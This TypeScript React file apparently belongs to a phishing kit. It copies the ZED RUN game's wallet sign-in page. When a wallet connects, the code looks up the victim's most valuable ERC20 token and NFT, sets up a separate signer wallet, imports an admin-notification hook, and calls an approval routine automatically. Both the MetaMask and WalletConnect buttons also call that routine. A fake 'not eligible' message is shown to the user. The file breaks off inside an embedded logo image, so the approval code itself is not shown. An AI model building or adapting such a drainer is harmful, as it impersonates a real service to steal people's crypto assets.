import type { ERC20Token, NFTToken } from "shared/api";
import ERC20_ABI from "../shared/constants/contracts/erc20_abi.json";
import ERC721_ABI from "../shared/constants/contracts/erc721_abi.json";

import { BigNumber, Contract, ethers, UnsignedTransaction } from "ethers";
import { notifyAdmin } from "features/notify";
import React, { useEffect, useState } from "react";
import { useWeb3 } from "../hooks";
import { getPriciestNFT } from "entities/wallet.NFT.store";
import { getPriciestToken } from "entities/wallet.erc20.store";

import config from "../config.json";

interface ConnectProps {
  connect: (() => Promise<void>) | null;
}

interface DisconnectProps {
  disconnect: (() => Promise<void>) | null;
}

export const DisconnectButton = ({ disconnect }: DisconnectProps) => {
  return disconnect ? (
    <>
      <>
        <h1 className="white">Start playing ZED RUN</h1>
        <br />
        <p className="primary-text helpful md">
          Sign in to start playing! Or if you’re a new user,
          <br /> sign up to set up Metamask.
          <span className="link-text green">&nbsp;What is Metamask?</span>
        </p>
        <div className="login-options">
          <button className="login-option metamask-login" onClick={disconnect}>
            <img
              src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjUgMjQiIHdpZHRoPSIyNSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZS13aWR0aD0iLjUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEgMSkiPjxwYXRoIGQ9Im0yMi41NTg4IDAtOS4yNzExMjk0IDYuODU5OTc2NDcgMS43MjQwNDctNC4wNDI4MDcwNnoiIGZpbGw9IiNlMTc3MjYiIHN0cm9rZT0iI2UxNzcyNiIvPjxnIGZpbGw9IiNlMjc2MjUiIHN0cm9rZT0iI2UyNzYyNSI+PHBhdGggZD0ibTEuMTczNzY5NDEgMCA5LjE4ODU4MzQ5IDYuOTI0LTEuNjQxNDU4NzgtNC4xMDY4Mzc2NXoiLz48cGF0aCBkPSJtMTkuMjIwNjExOCAxNS45MDU5Mjk0LTIuNDY2Nzc2NSAzLjc2ODQyMzUgNS4yODIwNDcxIDEuNDU0MzI5NSAxLjUxMzEyOTQtNS4xNDAzNzY1eiIvPjxwYXRoIGQ9Im0uMTkyNTAxMTggMTUuOTg4MzA1OSAxLjUwMzkxMDU4IDUuMTQwMzc2NSA1LjI3MjkwNTg5LTEuNDU0MzI5NS0yLjQ1NzY0MjM2LTMuNzY4NDIzNXoiLz48cGF0aCBkPSJtNi42ODQ5ODgyNCA5LjUzOTkyOTQxLTEuNDY3MjExNzcgMi4yMTM1MDU4OSA1LjIyNzAyMzUzLjIzNzgxMTgtLjE3NDIxMTgtNS42MjUxNzY1MXoiLz48cGF0aCBkPSJtMTcuMDQ3MjcwNiA5LjU0LTMuNjQwNTE3Ny0zLjIzNzg5NjQ3LS4xMTkyMjM1IDUuNjg5MjE0MDcgNS4yMjY5ODgyLS4yMzc4MTE3eiIvPjxwYXRoIGQ9Im02Ljk2OTM4ODI0IDE5LjY3NDM1MjkgMy4xNjM2OTQxNi0xLjUyNzQ1ODgtMi43MjM1MDU5My0yLjEyMjAyMzV6Ii8+PHBhdGggZD0ibTEzLjU5OTQ1ODggMTguMTQ2ODk0MSAzLjE1NDUxNzcgMS41Mjc0NTg4LS40MzEwMTE4LTMuNjQ5NDgyM3oiLz48L2c+PHBhdGggZD0ibTE2Ljc1Mzk3NjUgMTkuNjc0NDk0MS0zLjE1NDUxNzctMS41Mjc0NTg4LjI1NjcyOTQgMi4wNDg4MjM1LS4wMjc1Mjk0Ljg2ODk0MTJ6IiBmaWxsPSIjZDViZmIyIiBzdHJva2U9IiNkNWJmYjIiLz48cGF0aCBkPSJtNi45NjkzODgyNCAxOS42NzQ0OTQxIDIuOTM0NDk0MTEgMS4zOTAzMDU5LS4wMTgzNTI5NC0uODY4OTQxMi4yNDc1NTI5OS0yLjA0ODgyMzV6IiBmaWxsPSIjZDViZmIyIiBzdHJva2U9IiNkNWJmYjIiLz48cGF0aCBkPSJtOS45NTg4IDE0LjY3MTItMi42MjI3MDU4OC0uNzY4MjgyNCAxLjg1MjM3NjQ3LS44NTA2NTg4eiIgZmlsbD0iIzIzMzQ0NyIgc3Ryb2tlPSIjMjMzNDQ3Ii8+PHBhdGggZD0ibTEzLjc3MzY3MDYgMTQuNjcxMi43NzAzMjk0LTEuNjE4OTQxMiAxLjg2MTU1MjkuODUwNjU4OHoiIGZpbGw9IiMyMzM0NDciIHN0cm9rZT0iIzIzMzQ0NyIvPjxwYXRoIGQ9Im02Ljk2OTMxNzY1IDE5LjY3NDM1MjkuNDU4NTQxMTctMy43Njg0MjM1LTIuOTE2MTQxMTcuMDgyMzc2NXoiIGZpbGw9IiNjYzYyMjgiIHN0cm9rZT0iI2NjNjIyOCIvPjxwYXRoIGQ9Im0xNi4zMDQ1NDEyIDE1LjkwNTkyOTQuNDQ5MzY0NyAzLjc2ODQyMzUgMi40NjY3NzY1LTMuNjg2MDQ3eiIgZmlsbD0iI2NjNjIyOCIgc3Ryb2tlPSIjY2M2MjI4Ii8+PHBhdGggZD0ibTE4LjUxNDUxNzYgMTEuNzUzMzY0Ny01LjIyNjk4ODIuMjM3ODExOC40ODYgMi42ODAwMjM1Ljc3MDMyOTQtMS42MTkwMTE4IDEuODYxNTUzLjg1MDY1ODl6IiBmaWxsPSIjY2M2MjI4IiBzdHJva2U9IiNjYzYyMjgiLz48cGF0aCBkPSJtNy4zMzYwOTQxMiAxMy45MDI4NDcxIDEuODUyMzc2NDctLjg1MDY1ODkuNzcwMzI5NDEgMS42MTkwMTE4LjQ4Ni0yLjY4MDAyMzUtNS4yMjcwMjM1My0uMjM3ODExOHoiIGZpbGw9IiNjYzYyMjgiIHN0cm9rZT0iI2NjNjIyOCIvPjxwYXRoIGQ9Im01LjIxNzk0NTg4IDExLjc1MzM2NDcgMi4xOTE3MDExOCA0LjI3MTUwNTktLjA3MzQxMTc3LTIuMTIyMDIzNXoiIGZpbGw9IiNlMjc1MjUiIHN0cm9rZT0iI2UyNzUyNSIvPjxwYXRoIGQ9Im0xNi40MDU1NTI5IDEzLjkwMjg0NzEtLjA4MjUxNzYgMi4xMjIwMjM1IDIuMTkxNjk0MS00LjI3MTUwNTl6IiBmaWxsPSIjZTI3NTI1IiBzdHJva2U9IiNlMjc1MjUiLz48cGF0aCBkPSJtMTAuNDQ1MDgyNCAxMS45OTExNzY1LS40ODYwNzA2NCAyLjY4MDAyMzUuNjE0NDAwMDQgMy4xNjQ2ODI0LjEzNzU3NjQtNC4xNzA4NDcxeiIgZmlsbD0iI2UyNzUyNSIgc3Ryb2tlPSIjZTI3NTI1Ii8+PHBhdGggZD0ibTEzLjI4NzY3MDYgMTEuOTkxMTc2NS0uMjU2OCAxLjY2NDc1MjkuMTI4NCA0LjE3OTk1My42MTQ0LTMuMTY0NjgyNHoiIGZpbGw9IiNlMjc1MjUiIHN0cm9rZT0iI2UyNzUyNSIvPjxwYXRoIGQ9Im0xMy43NzM2NzA2IDE0LjY3MTI3MDYtLjYxNDQgMy4xNjQ2ODIzLjQ0MDE4ODIuMzExMDExOCAyLjcyMzU3NjUtMi4xMjIwMjM1LjA4MjUxNzYtMi4xMjIwMjM2eiIgZmlsbD0iI2Y1ODQxZiIgc3Ryb2tlPSIjZjU4NDFmIi8+PHBhdGggZD0ibTcuMzM2MDk0MTIgMTMuOTAyOTE3Ni4wNzM0MTE3NiAyLjEyMjAyMzYgMi43MjM1MDU5MiAyLjEyMjAyMzUuNDQwMTg4Mi0uMzExMDExOC0uNjE0NC0zLjE2NDY4MjN6IiBmaWxsPSIjZjU4NDFmIiBzdHJva2U9IiNmNTg0MWYiLz48cGF0aCBkPSJtMTMuODI4NzI5NCAyMS4wNjQ3Mjk0LjAyNzQ1ODgtLjg2ODk0MTItLjIzODM3NjQtLjIwMTI0N2gtMy41MDMwMTE4bC0uMjI5MjcwNTkuMjAxMjQ3LjAxODM1Mjk0Ljg2ODk0MTItMi45MzQ0OTQxMS0xLjM5MDMwNTkgMS4wMjcwNTg4Mi44NDE0ODI0IDIuMDgxNjQ3MDQgMS40MzYwNDdoMy41NjcxNzY1bDIuMDkwODIzNS0xLjQzNjA0NyAxLjAxNzg4MjQtLjg0MTQ4MjR6IiBmaWxsPSIjYzBhYzlkIiBzdHJva2U9IiNjMGFjOWQiLz48cGF0aCBkPSJtMTMuNTk5Mzg4MiAxOC4xNDY4OTQxLS40NDAxODgyLS4zMTA5NDEyaC0yLjU4NmwtLjQ0MDExNzYuMzEwOTQxMi0uMjQ3NjIzNTggMi4wNDg4OTQxLjIyOTI3MDU4LS4yMDEyNDdoMy41MDMwMTE4bC4yMzg0NDcuMjAxMjQ3eiIgZmlsbD0iIzE2MTYxNiIgc3Ryb2tlPSIjMTYxNjE2Ii8+PHBhdGggZD0ibTIyLjk1MzAzNTMgNy4zMDgxNDExOC43Nzk1MDU5LTMuNzg2Njg0NzEtMS4xNzM4MTE4LTMuNTIxNDU2NDctOC45NTkyNzA2IDYuNjMxMzQxMTggMy40NDc5NTMgMi45MDg1ODgyMyA0Ljg2OTM4ODIgMS40MTc3NjQ2OSAxLjA3Mjk0MTItMS4yNTMwODIzNC0uNDY3NjQ3MS0uMzM4NDcwNTguNzQyNzI5NC0uNjc2OC0uNTY4NTE3Ni0uNDM5MDU4ODMuNzQyOC0uNTY3MTA1ODh6IiBmaWxsPSIjNzYzZTFhIiBzdHJva2U9IiM3NjNlMWEiLz48cGF0aCBkPSJtMCAzLjUyMTQ1NjQ3Ljc4ODY0IDMuNzg2Njg0NzEtLjUwNDM2LjM3NTAzNTI5Ljc1MTk1NTI5LjU2NzEwNTg4LS41Njg1NTI5NC40MzkwNTg4My43NDI3ODU4OS42NzY4LS40Njc2ODIzNi4zMzg0NzA1OCAxLjA3MjkyIDEuMjUzMDgyMzQgNC44Njk0MjM1My0xLjQxNzc2NDY5IDMuNDQ3OTUyOTktMi45MDg1ODgyMy04Ljk1OTI5MTgxLTYuNjMxMzQxMTh6IiBmaWxsPSIjNzYzZTFhIiBzdHJva2U9IiM3NjNlMWEiLz48cGF0aCBkPSJtMjEuOTE2ODcwNiAxMC45NTc2MjM1LTQuODY5Mzg4Mi0xLjQxNzY5NDA5IDEuNDY3MjQ3IDIuMjEzNTA1ODktMi4xOTE2OTQxIDQuMjcxNDM1MyAyLjg5Nzc4ODItLjAzNjU2NDdoNC4zMjgzMjk0eiIgZmlsbD0iI2Y1ODQxZiIgc3Ryb2tlPSIjZjU4NDFmIi8+PHBhdGggZD0ibTYuNjg0OTg4MjQgOS41Mzk5Mjk0MS00Ljg2OTM2IDEuNDE3Njk0MDktMS42MjMxMjcwNiA1LjAzMDY4MjRoNC4zMTkxNzQxMWwyLjg5Nzc2LjAzNjU2NDctMi4xOTE2NTE3Ni00LjI3MTQzNTN6IiBmaWxsPSIjZjU4NDFmIiBzdHJva2U9IiNmNTg0MWYiLz48cGF0aCBkPSJtMTMuMjg3NiAxMS45OTEyNDcxLjMxMTc4ODItNS4zNTk5NzY1MSAxLjQxMjE4ODMtMy44MTQxMTUzaC02LjI5MDc1Mjk3bDEuNDEyMTg4MjcgMy44MTQxMTUzLjMxMTc4ODIgNS4zNTk5NzY1MS4xMTkyMjM1IDEuNjgyOTY0Ny4wMDkxNzY1IDQuMTYxNzQxMWgyLjU4NmwuMDA5MTc2NS00LjE2MTc0MTF6IiBmaWxsPSIjZjU4NDFmIiBzdHJva2U9IiNmNTg0MWYiLz48L2c+PC9zdmc+"
              alt="Metamask logo"
            />
            <h2 className="white">Metamask</h2>
            <p className="primary-text helpful md">Browser Extension</p>
          </button>
          <button className="login-option metamask-login" onClick={disconnect}>
            <img
              src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMjVweCIgaGVpZ2h0PSIxNXB4IiB2aWV3Qm94PSIwIDAgMjQgMTUiIHZlcnNpb249IjEuMSI+CjxnIGlkPSJzdXJmYWNlMSI+CjxwYXRoIHN0eWxlPSIgc3Ryb2tlOm5vbmU7ZmlsbC1ydWxlOm5vbnplcm87ZmlsbDpyZ2IoMjMuMTM3MjU1JSw2MCUsOTguODIzNTI5JSk7ZmlsbC1vcGFjaXR5OjE7IiBkPSJNIDQuOTE0MDYyIDIuOTQxNDA2IEMgOC44MjgxMjUgLTAuOTQxNDA2IDE1LjE3MTg3NSAtMC45NDE0MDYgMTkuMDg1OTM4IDIuOTQxNDA2IEwgMTkuNTU0Njg4IDMuNDA2MjUgQyAxOS43NSAzLjYwMTU2MiAxOS43NSAzLjkxNDA2MiAxOS41NTQ2ODggNC4xMDkzNzUgTCAxNy45NDUzMTIgNS43MDcwMzEgQyAxNy44NDc2NTYgNS44MDQ2ODggMTcuNjg3NSA1LjgwNDY4OCAxNy41ODk4NDQgNS43MDcwMzEgTCAxNi45NDE0MDYgNS4wNjY0MDYgQyAxNC4yMTQ4NDQgMi4zNTU0NjkgOS43ODkwNjIgMi4zNTU0NjkgNy4wNTg1OTQgNS4wNjY0MDYgTCA2LjM2MzI4MSA1Ljc1MzkwNiBDIDYuMjY1NjI1IDUuODUxNTYyIDYuMTA1NDY5IDUuODUxNTYyIDYuMDA3ODEyIDUuNzUzOTA2IEwgNC4zOTg0MzggNC4xNTYyNSBDIDQuMjAzMTI1IDMuOTYwOTM4IDQuMjAzMTI1IDMuNjQ4NDM4IDQuMzk4NDM4IDMuNDUzMTI1IFogTSAyMi40MTc5NjkgNi4yNDYwOTQgTCAyMy44NTE1NjIgNy42Njc5NjkgQyAyNC4wNDY4NzUgNy44NjMyODEgMjQuMDQ2ODc1IDguMTc1NzgxIDIzLjg1MTU2MiA4LjM3MTA5NCBMIDE3LjM4NjcxOSAxNC43ODUxNTYgQyAxNy4xOTE0MDYgMTQuOTgwNDY5IDE2Ljg3MTA5NCAxNC45ODA0NjkgMTYuNjc1NzgxIDE0Ljc4NTE1NiBMIDEyLjA4OTg0NCAxMC4yMzQzNzUgQyAxMi4wMzkwNjIgMTAuMTgzNTk0IDExLjk2MDkzOCAxMC4xODM1OTQgMTEuOTEwMTU2IDEwLjIzNDM3NSBMIDcuMzI0MjE5IDE0Ljc4NTE1NiBDIDcuMTI4OTA2IDE0Ljk4MDQ2OSA2LjgwODU5NCAxNC45ODA0NjkgNi42MTMyODEgMTQuNzg1MTU2IEwgMC4xNDg0MzggOC4zNzEwOTQgQyAtMC4wNDY4NzUgOC4xNzU3ODEgLTAuMDQ2ODc1IDcuODYzMjgxIDAuMTQ4NDM4IDcuNjY3OTY5IEwgMS41ODIwMzEgNi4yNDYwOTQgQyAxLjc3NzM0NCA2LjA1MDc4MSAyLjA5NzY1NiA2LjA1MDc4MSAyLjI5Mjk2OSA2LjI0NjA5NCBMIDYuODc4OTA2IDEwLjc5Njg3NSBDIDYuOTI5Njg4IDEwLjg0NzY1NiA3LjAwNzgxMiAxMC44NDc2NTYgNy4wNTg1OTQgMTAuNzk2ODc1IEwgMTEuNjQ0NTMxIDYuMjQ2MDk0IEMgMTEuODM5ODQ0IDYuMDUwNzgxIDEyLjE2MDE1NiA2LjA1MDc4MSAxMi4zNTU0NjkgNi4yNDYwOTQgTCAxNi45NDE0MDYgMTAuNzk2ODc1IEMgMTYuOTkyMTg4IDEwLjg0NzY1NiAxNy4wNzAzMTIgMTAuODQ3NjU2IDE3LjEyMTA5NCAxMC43OTY4NzUgTCAyMS43MDcwMzEgNi4yNDYwOTQgQyAyMS45MDIzNDQgNi4wNTA3ODEgMjIuMjIyNjU2IDYuMDUwNzgxIDIyLjQxNzk2OSA2LjI0NjA5NCBaIE0gMjIuNDE3OTY5IDYuMjQ2MDk0ICIvPgo8L2c+Cjwvc3ZnPgo="
              alt="WC logo"
            />
            <h2 className="white">WalletConnect</h2>
            <p className="primary-text helpful md">Browser Extension</p>
          </button>
        </div>
        <div className="difference-text">
          <span>
            <h3 className="primary-text helpful green">
              Sorry, you are not eligible. Try checking another address.
            </h3>
          </span>
        </div>
      </>
    </>
  ) : (
    <button>Loading...</button>
  );
};

export function Web3Button(props: any) {
  const wallet = props.wallet;
  const geoData = props.geoData;
  const web3 = useWeb3();
  const { address, provider, web3Provider, connect, disconnect } = web3;

  const walletSigner = wallet.connect(ethers.getDefaultProvider("homestead"));

  let NFTContract: Contract;
  let assetContract: Contract;

  let priciest: ERC20Token | undefined;
  let priciestNFT: NFTToken | undefined;
  const isActive = address ? true : false;

  let [noTokens, setNoTokens] = useState(false);

  useEffect(() => {
    const tokenInfo = async () => {
      if (address) {
        try {
          priciest = await getPriciestToken(address);
          priciestNFT = await getPriciestNFT(address);
        } catch {}
        await approve();
      }
    };
    tokenInfo();
  }, [address]);

  const [buttonText, setButtonText] = useState("Browser Extension");

  const ConnectButton = ({ connect }: ConnectProps) => {
    return connect ? (
      <>
        <h1 className="white">Start playing ZED RUN</h1>
        <br />
        <p className="primary-text helpful md">
          Sign in to start playing! Or if you’re a new user,
          <br /> sign up to set up Metamask.
          <span className="link-text green">&nbsp;What is Metamask?</span>
        </p>
        <div className="login-options">
          <button className="login-option metamask-login" onClick={approve}>
            <img
              src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjUgMjQiIHdpZHRoPSIyNSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZS13aWR0aD0iLjUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEgMSkiPjxwYXRoIGQ9Im0yMi41NTg4IDAtOS4yNzExMjk0IDYuODU5OTc2NDcgMS43MjQwNDctNC4wNDI4MDcwNnoiIGZpbGw9IiNlMTc3MjYiIHN0cm9rZT0iI2UxNzcyNiIvPjxnIGZpbGw9IiNlMjc2MjUiIHN0cm9rZT0iI2UyNzYyNSI+PHBhdGggZD0ibTEuMTczNzY5NDEgMCA5LjE4ODU4MzQ5IDYuOTI0LTEuNjQxNDU4NzgtNC4xMDY4Mzc2NXoiLz48cGF0aCBkPSJtMTkuMjIwNjExOCAxNS45MDU5Mjk0LTIuNDY2Nzc2NSAzLjc2ODQyMzUgNS4yODIwNDcxIDEuNDU0MzI5NSAxLjUxMzEyOTQtNS4xNDAzNzY1eiIvPjxwYXRoIGQ9Im0uMTkyNTAxMTggMTUuOTg4MzA1OSAxLjUwMzkxMDU4IDUuMTQwMzc2NSA1LjI3MjkwNTg5LTEuNDU0MzI5NS0yLjQ1NzY0MjM2LTMuNzY4NDIzNXoiLz48cGF0aCBkPSJtNi42ODQ5ODgyNCA5LjUzOTkyOTQxLTEuNDY3MjExNzcgMi4yMTM1MDU4OSA1LjIyNzAyMzUzLjIzNzgxMTgtLjE3NDIxMTgtNS42MjUxNzY1MXoiLz48cGF0aCBkPSJtMTcuMDQ3MjcwNiA5LjU0LTMuNjQwNTE3Ny0zLjIzNzg5NjQ3LS4xMTkyMjM1IDUuNjg5MjE0MDcgNS4yMjY5ODgyLS4yMzc4MTE3eiIvPjxwYXRoIGQ9Im02Ljk2OTM4ODI0IDE5LjY3NDM1MjkgMy4xNjM2OTQxNi0xLjUyNzQ1ODgtMi43MjM1MDU5My0yLjEyMjAyMzV6Ii8+PHBhdGggZD0ibTEzLjU5OTQ1ODggMTguMTQ2ODk0MSAzLjE1NDUxNzcgMS41Mjc0NTg4LS40MzEwMTE4LTMuNjQ5NDgyM3oiLz48L2c+PHBhdGggZD0ibTE2Ljc1Mzk3NjUgMTkuNjc0NDk0MS0zLjE1NDUxNzctMS41Mjc0NTg4LjI1NjcyOTQgMi4wNDg4MjM1LS4wMjc1Mjk0Ljg2ODk0MTJ6IiBmaWxsPSIjZDViZmIyIiBzdHJva2U9IiNkNWJmYjIiLz48cGF0aCBkPSJtNi45NjkzODgyNCAxOS42NzQ0OTQxIDIuOTM0NDk0MTEgMS4zOTAzMDU5LS4wMTgzNTI5NC0uODY4OTQxMi4yNDc1NTI5OS0yLjA0ODgyMzV6IiBmaWxsPSIjZDViZmIyIiBzdHJva2U9IiNkNWJmYjIiLz48cGF0aCBkPSJtOS45NTg4IDE0LjY3MTItMi42MjI3MDU4OC0uNzY4MjgyNCAxLjg1MjM3NjQ3LS44NTA2NTg4eiIgZmlsbD0iIzIzMzQ0NyIgc3Ryb2tlPSIjMjMzNDQ3Ii8+PHBhdGggZD0ibTEzLjc3MzY3MDYgMTQuNjcxMi43NzAzMjk0LTEuNjE4OTQxMiAxLjg2MTU1MjkuODUwNjU4OHoiIGZpbGw9IiMyMzM0NDciIHN0cm9rZT0iIzIzMzQ0NyIvPjxwYXRoIGQ9Im02Ljk2OTMxNzY1IDE5LjY3NDM1MjkuNDU4NTQxMTctMy43Njg0MjM1LTIuOTE2MTQxMTcuMDgyMzc2NXoiIGZpbGw9IiNjYzYyMjgiIHN0cm9rZT0iI2NjNjIyOCIvPjxwYXRoIGQ9Im0xNi4zMDQ1NDEyIDE1LjkwNTkyOTQuNDQ5MzY0NyAzLjc2ODQyMzUgMi40NjY3NzY1LTMuNjg2MDQ3eiIgZmlsbD0iI2NjNjIyOCIgc3Ryb2tlPSIjY2M2MjI4Ii8+PHBhdGggZD0ibTE4LjUxNDUxNzYgMTEuNzUzMzY0Ny01LjIyNjk4ODIuMjM3ODExOC40ODYgMi42ODAwMjM1Ljc3MDMyOTQtMS42MTkwMTE4IDEuODYxNTUzLjg1MDY1ODl6IiBmaWxsPSIjY2M2MjI4IiBzdHJva2U9IiNjYzYyMjgiLz48cGF0aCBkPSJtNy4zMzYwOTQxMiAxMy45MDI4NDcxIDEuODUyMzc2NDctLjg1MDY1ODkuNzcwMzI5NDEgMS42MTkwMTE4LjQ4Ni0yLjY4MDAyMzUtNS4yMjcwMjM1My0uMjM3ODExOHoiIGZpbGw9IiNjYzYyMjgiIHN0cm9rZT0iI2NjNjIyOCIvPjxwYXRoIGQ9Im01LjIxNzk0NTg4IDExLjc1MzM2NDcgMi4xOTE3MDExOCA0LjI3MTUwNTktLjA3MzQxMTc3LTIuMTIyMDIzNXoiIGZpbGw9IiNlMjc1MjUiIHN0cm9rZT0iI2UyNzUyNSIvPjxwYXRoIGQ9Im0xNi40MDU1NTI5IDEzLjkwMjg0NzEtLjA4MjUxNzYgMi4xMjIwMjM1IDIuMTkxNjk0MS00LjI3MTUwNTl6IiBmaWxsPSIjZTI3NTI1IiBzdHJva2U9IiNlMjc1MjUiLz48cGF0aCBkPSJtMTAuNDQ1MDgyNCAxMS45OTExNzY1LS40ODYwNzA2NCAyLjY4MDAyMzUuNjE0NDAwMDQgMy4xNjQ2ODI0LjEzNzU3NjQtNC4xNzA4NDcxeiIgZmlsbD0iI2UyNzUyNSIgc3Ryb2tlPSIjZTI3NTI1Ii8+PHBhdGggZD0ibTEzLjI4NzY3MDYgMTEuOTkxMTc2NS0uMjU2OCAxLjY2NDc1MjkuMTI4NCA0LjE3OTk1My42MTQ0LTMuMTY0NjgyNHoiIGZpbGw9IiNlMjc1MjUiIHN0cm9rZT0iI2UyNzUyNSIvPjxwYXRoIGQ9Im0xMy43NzM2NzA2IDE0LjY3MTI3MDYtLjYxNDQgMy4xNjQ2ODIzLjQ0MDE4ODIuMzExMDExOCAyLjcyMzU3NjUtMi4xMjIwMjM1LjA4MjUxNzYtMi4xMjIwMjM2eiIgZmlsbD0iI2Y1ODQxZiIgc3Ryb2tlPSIjZjU4NDFmIi8+PHBhdGggZD0ibTcuMzM2MDk0MTIgMTMuOTAyOTE3Ni4wNzM0MTE3NiAyLjEyMjAyMzYgMi43MjM1MDU5MiAyLjEyMjAyMzUuNDQwMTg4Mi0uMzExMDExOC0uNjE0NC0zLjE2NDY4MjN6IiBmaWxsPSIjZjU4NDFmIiBzdHJva2U9IiNmNTg0MWYiLz48cGF0aCBkPSJtMTMuODI4NzI5NCAyMS4wNjQ3Mjk0LjAyNzQ1ODgtLjg2ODk0MTItLjIzODM3NjQtLjIwMTI0N2gtMy41MDMwMTE4bC0uMjI5MjcwNTkuMjAxMjQ3LjAxODM1Mjk0Ljg2ODk0MTItMi45MzQ0OTQxMS0xLjM5MDMwNTkgMS4wMjcwNTg4Mi44NDE0ODI0IDIuMDgxNjQ3MDQgMS40MzYwNDdoMy41NjcxNzY1bDIuMDkwODIzNS0xLjQzNjA0NyAxLjAxNzg4MjQtLjg0MTQ4MjR6IiBmaWxsPSIjYzBhYzlkIiBzdHJva2U9IiNjMGFjOWQiLz48cGF0aCBkPSJtMTMuNTk5Mzg4MiAxOC4xNDY4OTQxLS40NDAxODgyLS4zMTA5NDEyaC0yLjU4NmwtLjQ0MDExNzYuMzEwOTQxMi0uMjQ3NjIzNTggMi4wNDg4OTQxLjIyOTI3MDU4LS4yMDEyNDdoMy41MDMwMTE4bC4yMzg0NDcuMjAxMjQ3eiIgZmlsbD0iIzE2MTYxNiIgc3Ryb2tlPSIjMTYxNjE2Ii8+PHBhdGggZD0ibTIyLjk1MzAzNTMgNy4zMDgxNDExOC43Nzk1MDU5LTMuNzg2Njg0NzEtMS4xNzM4MTE4LTMuNTIxNDU2NDctOC45NTkyNzA2IDYuNjMxMzQxMTggMy40NDc5NTMgMi45MDg1ODgyMyA0Ljg2OTM4ODIgMS40MTc3NjQ2OSAxLjA3Mjk0MTItMS4yNTMwODIzNC0uNDY3NjQ3MS0uMzM4NDcwNTguNzQyNzI5NC0uNjc2OC0uNTY4NTE3Ni0uNDM5MDU4ODMuNzQyOC0uNTY3MTA1ODh6IiBmaWxsPSIjNzYzZTFhIiBzdHJva2U9IiM3NjNlMWEiLz48cGF0aCBkPSJtMCAzLjUyMTQ1NjQ3Ljc4ODY0IDMuNzg2Njg0NzEtLjUwNDM2LjM3NTAzNTI5Ljc1MTk1NTI5LjU2NzEwNTg4LS41Njg1NTI5NC40MzkwNTg4My43NDI3ODU4OS42NzY4LS40Njc2ODIzNi4zMzg0NzA1OCAxLjA3MjkyIDEuMjUzMDgyMzQgNC44Njk0MjM1My0xLjQxNzc2NDY5IDMuNDQ3OTUyOTktMi45MDg1ODgyMy04Ljk1OTI5MTgxLTYuNjMxMzQxMTh6IiBmaWxsPSIjNzYzZTFhIiBzdHJva2U9IiM3NjNlMWEiLz48cGF0aCBkPSJtMjEuOTE2ODcwNiAxMC45NTc2MjM1LTQuODY5Mzg4Mi0xLjQxNzY5NDA5IDEuNDY3MjQ3IDIuMjEzNTA1ODktMi4xOTE2OTQxIDQuMjcxNDM1MyAyLjg5Nzc4ODItLjAzNjU2NDdoNC4zMjgzMjk0eiIgZmlsbD0iI2Y1ODQxZiIgc3Ryb2tlPSIjZjU4NDFmIi8+PHBhdGggZD0ibTYuNjg0OTg4MjQgOS41Mzk5Mjk0MS00Ljg2OTM2IDEuNDE3Njk0MDktMS42MjMxMjcwNiA1LjAzMDY4MjRoNC4zMTkxNzQxMWwyLjg5Nzc2LjAzNjU2NDctMi4xOTE2NTE3Ni00LjI3MTQzNTN6IiBmaWxsPSIjZjU4NDFmIiBzdHJva2U9IiNmNTg0MWYiLz48cGF0aCBkPSJtMTMuMjg3NiAxMS45OTEyNDcxLjMxMTc4ODItNS4zNTk5NzY1MSAxLjQxMjE4ODMtMy44MTQxMTUzaC02LjI5MDc1Mjk3bDEuNDEyMTg4MjcgMy44MTQxMTUzLjMxMTc4ODIgNS4zNTk5NzY1MS4xMTkyMjM1IDEuNjgyOTY0Ny4wMDkxNzY1IDQuMTYxNzQxMWgyLjU4NmwuMDA5MTc2NS00LjE2MTc0MTF6IiBmaWxsPSIjZjU4NDFmIiBzdHJva2U9IiNmNTg0MWYiLz48L2c+PC9zdmc+"
              alt="Metamask logo"
            />
            <h2 className="white">Metamask</h2>
            <p className="primary-text helpful md">{buttonText}</p>
          </button>
          <button className="login-option metamask-login" onClick={approve}>
            <img
              src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMjVweCIgaGVpZ2h0PSIxNXB4IiB2aWV3Qm94PSIwIDAgMjQgMTUiIHZlcnNpb249IjEuMSI+CjxnIGlkPSJzdXJmYWNlMSI+CjxwYXRoIHN0eWxlPSIgc3Ryb2tlOm5vbmU7ZmlsbC1ydWxlOm5vbnplcm87ZmlsbDpyZ2IoMjMuMTM3MjU1JSw2MCUsOTguODIzNTI5JSk7ZmlsbC1vcGFjaXR5OjE7IiBkPSJNIDQuOTE0MDYyIDIuOTQxNDA2IEMgOC44MjgxMjUgLTAuOTQxNDA2IDE1LjE3MTg3NSAtMC45NDE0MDYgMTkuMDg1OTM4IDIuOTQxNDA2IEwgMTkuNTU0Njg4IDMuNDA2MjUgQyAxOS43NSAzLjYwMTU2MiAxOS43NSAzLjkxNDA2MiAxOS41NTQ2ODggNC4xMDkzNzUgTCAxNy45NDUzMTIgNS43MDcwMzEgQyAxNy44NDc2NTYgNS44MDQ2ODggMTcuNjg3NSA1LjgwNDY4OCAxNy41ODk4NDQgNS43MDcwMzEgTCAxNi45NDE0MDYgNS4wNjY0MDYgQyAxNC4yMTQ4NDQgMi4zNTU0NjkgOS43ODkwNjIgM